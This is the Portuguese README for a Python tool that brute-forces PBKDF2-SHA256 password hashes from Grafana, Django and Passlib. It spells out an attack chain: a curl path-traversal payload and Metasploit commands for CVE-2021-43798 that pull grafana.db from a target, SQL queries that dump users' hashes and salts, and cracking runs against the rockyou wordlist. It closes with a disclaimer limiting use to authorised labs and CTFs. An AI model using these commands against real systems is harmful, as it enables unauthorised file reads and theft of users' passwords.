# pbkdf2_crack.py

Ferramenta de força bruta para hashes **PBKDF2-HMAC-SHA256**, com suporte nativo aos formatos usados por Grafana, Django, Passlib e modo raw para qualquer aplicação que utilize esse esquema de hash.

---

## Sumário

- [Descrição](#descrição)
- [Requisitos](#requisitos)
- [Instalação](#instalação)
- [Formatos suportados](#formatos-suportados)
- [Uso](#uso)
- [Opções](#opções)
- [Exemplos](#exemplos)
- [Como obter os hashes](#como-obter-os-hashes)
- [Desempenho](#desempenho)
- [Referências](#referências)

---

## Descrição

PBKDF2-SHA256 é uma função de derivação de chave amplamente usada para armazenar senhas com segurança. Por ser computacionalmente custosa (alto número de iterações), ferramentas genéricas como Hashcat podem ter dificuldades de memória em ambientes restritos. Este script resolve isso rodando o cracking diretamente em Python com multiprocessing, tornando-o portável e eficiente em qualquer ambiente com CPU.

**Aplicações que usam PBKDF2-SHA256:**

| Aplicação | Iterações padrão | dklen |
|-----------|-----------------|-------|
| Grafana   | 10.000          | 50    |
| Django    | 260.000+        | 32    |
| Passlib   | variável        | 32    |

---

## Requisitos

- Python 3.6+
- Sem dependências externas (usa apenas biblioteca padrão)

---

## Instalação

```bash
git clone https://github.com/seu-usuario/pbkdf2_crack
cd pbkdf2_crack
chmod +x pbkdf2_crack.py
```

---

## Formatos suportados

### `grafana`

Hashes extraídos do banco SQLite do Grafana. O hash é armazenado em hexadecimal com salt em texto plano.

```
hash  : d0dbe567951b6d460c481eefe7ac5d58...  (hex, 100 chars)
salt  : Uzkmhw7RLV                           (plaintext)
iter  : 10.000
dklen : 50 bytes
```

Como extrair:
```bash
sqlite3 grafana.db "select login, password, salt from user;"
```

---

### `django`

Formato padrão do Django `PasswordHasher`. O token completo é passado via `--token`.

```
pbkdf2_sha256$260000$<salt>$<base64_hash>
```

Como extrair (Django shell ou banco diretamente):
```bash
python manage.py dbshell
SELECT username, password FROM auth_user;
```

---

### `passlib`

Formato da biblioteca Passlib, comum em aplicações Python que não usam Django.

```
$pbkdf2-sha256$<iterations>$<b64salt>$<b64hash>
```

---

### `raw`

Modo manual — útil quando a aplicação usa PBKDF2-SHA256 com parâmetros customizados. Você fornece hash, salt, iterações e dklen diretamente.

---

## Uso

```
python3 pbkdf2_crack.py --format <formato> [opções de hash] [opções de cracking]
```

---

## Opções

### Obrigatórias

| Opção | Descrição |
|-------|-----------|
| `--format` | Formato do hash: `grafana`, `django`, `passlib`, `raw` |

### Dados do hash (dependem do formato)

| Opção | Formatos | Descrição |
|-------|----------|-----------|
| `--hash` | grafana, raw | Hash em hexadecimal |
| `--salt` | grafana, raw | Salt em texto plano |
| `--token` | django, passlib | Token completo copiado do banco |
| `--iterations` | raw | Número de iterações PBKDF2 |
| `--dklen` | raw | Tamanho do derived key em bytes |

### Opções de cracking

| Opção | Padrão | Descrição |
|-------|--------|-----------|
| `-w`, `--wordlist` | `/usr/share/wordlists/rockyou.txt` | Caminho para a wordlist |
| `-t`, `--threads` | `4` | Número de processos paralelos |
| `-c`, `--chunk` | `100` | Tamanho do chunk por worker |
| `-v`, `--verbose` | off | Mostra progresso a cada 10.000 tentativas |

---

## Exemplos

### Grafana (CVE-2021-43798)

```bash
# 1. Extrair o hash via path traversal
msf> use auxiliary/scanner/http/grafana_plugin_traversal
msf> set RHOSTS <target>
msf> set FILEPATH /var/lib/grafana/grafana.db
msf> run

# 2. Ler o banco
sqlite3 /path/to/grafana.db "select login, password, salt from user;"
# yoshii|d0dbe567...|Uzkmhw7RLV

# 3. Quebrar a senha
python3 pbkdf2_crack.py --format grafana \
    --hash d0dbe567951b6d460c481eefe7ac5d582466f3d518870b1f70a68ac297739cb3345155c1f9d2544ba3f343e8dd39cdb51784 \
    --salt Uzkmhw7RLV
```

### Django

```bash
python3 pbkdf2_crack.py --format django \
    --token 'pbkdf2_sha256$260000$randomsalt$hashedvalue='
```

### Passlib

```bash
python3 pbkdf2_crack.py --format passlib \
    --token '$pbkdf2-sha256$29000$c3RyaW5n$hashedvalue='
```

### Raw (parâmetros manuais)

```bash
python3 pbkdf2_crack.py --format raw \
    --hash aabbccdd... \
    --salt mysalt \
    --iterations 10000 \
    --dklen 32
```

### Wordlist customizada + mais threads

```bash
python3 pbkdf2_crack.py --format grafana \
    --hash <hash> --salt <salt> \
    --wordlist /usr/share/wordlists/fasttrack.txt \
    --threads 8 \
    --verbose
```

---

## Como obter os hashes

### Grafana — CVE-2021-43798 (path traversal unauthenticated)

Afeta versões **8.0.0 a 8.3.0**. Permite leitura de arquivos arbitrários sem autenticação via endpoint de plugins.

```bash
# Via curl
curl -s "http://<target>:3000/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" \
    -o grafana.db

# Via Metasploit
use auxiliary/scanner/http/grafana_plugin_traversal
set RHOSTS <target>
set FILEPATH /var/lib/grafana/grafana.db
run
```

### Django

```bash
# Via Django shell
python manage.py shell -c "from django.contrib.auth.models import User; [print(u.username, u.password) for u in User.objects.all()]"

# Ou direto no banco SQLite
sqlite3 db.sqlite3 "select username, password from auth_user;"
```

---

## Desempenho

PBKDF2 é lento por design. Estimativas em CPU comum (4 cores):

| Iterações | h/s estimado | Tempo para 14M senhas |
|-----------|-------------|----------------------|
| 10.000    | ~1.000      | ~4 horas             |
| 100.000   | ~100        | ~40 horas            |
| 260.000   | ~40         | ~4 dias              |

**Dicas para acelerar:**

- Use `--threads` igual ao número de CPUs: `nproc`
- Prefira wordlists menores e focadas antes do rockyou completo
- Para iterações altas (Django 260k+), use senhas contextuais primeiro

```bash
# Verifica CPUs disponíveis
nproc

# Executa com máximo de threads
python3 pbkdf2_crack.py --format grafana \
    --hash <hash> --salt <salt> \
    --threads $(nproc) --verbose
```

---

## Referências

- [CVE-2021-43798 — Grafana Path Traversal](https://nvd.nist.gov/vuln/detail/CVE-2021-43798)
- [Grafana Security Advisory](https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/)
- [Django Password Hashing](https://docs.djangoproject.com/en/stable/topics/auth/passwords/)
- [Passlib PBKDF2](https://passlib.readthedocs.io/en/stable/lib/passlib.hash.pbkdf2_digest.html)
- [PBKDF2 — RFC 8018](https://www.rfc-editor.org/rfc/rfc8018)

---

> **Aviso:** Esta ferramenta deve ser usada exclusivamente em ambientes autorizados, como laboratórios de pentest, CTFs e avaliações de segurança com permissão explícita. O uso não autorizado contra sistemas de terceiros é ilegal.
